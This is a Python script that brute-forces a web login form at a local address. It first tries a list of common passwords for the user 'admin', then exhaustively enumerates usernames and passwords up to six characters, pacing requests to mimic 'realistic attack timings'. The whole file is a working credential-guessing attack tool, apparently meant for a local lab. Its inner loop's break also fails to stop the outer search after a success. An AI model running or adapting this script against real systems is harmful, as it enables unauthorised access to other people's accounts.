import requests
import itertools
import string
import time

# Extended character set for more complex brute force attempts
CHAR_SET = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

url = 'http://127.0.0.1:5000/signin'


def attempt_login(username, password):
    payload = {'username': username, 'password': password}
    # Allow the session to handle redirection automatically
    with requests.Session() as session:
        response = session.post(url, data=payload, allow_redirects=True)
        # Check if the redirected page indicates a successful login
        if "Logged in successfully" in response.text:
            return True
        else:
            return False


# Function to simulate a delay to reduce server load and simulate realistic attack timings
def simulated_delay():
    time.sleep(1)  # Adjust the delay as needed to control the request rate


# Use common password patterns or read from a list of common passwords
common_passwords = ['password', '123456', '123456789', 'qwerty', 'abc123', 'password1', '!@#$%^&*']
for password in common_passwords:
    # Log each attempt
    print(f"Attempting login with Username:'admin', Password: {password}")
    simulated_delay()  # Reduce the speed of attempts to mimic realistic conditions
    if attempt_login('admin', password):
        print(f"Success! Username: 'admin', Password: {password}")
        break

# Try different lengths for username and password

for username_length in range(1, 7):  # Example: Using shorter lengths for demonstration
    for password_length in range(1, 7):
        for username in itertools.product(CHAR_SET, repeat=username_length):
            for password in itertools.product(CHAR_SET, repeat=password_length):
                username_str = ''.join(username)
                password_str = ''.join(password)

                # Log each attempt
                print(f"Attempting login with Username: {username_str}, Password: {password_str}")
                simulated_delay()  # Reduce the speed of attempts to mimic realistic conditions

                if attempt_login(username_str, password_str):
                    print(f"Success! Username: {username_str}, Password: {password_str}")
                    break  # Exit after the first successful login

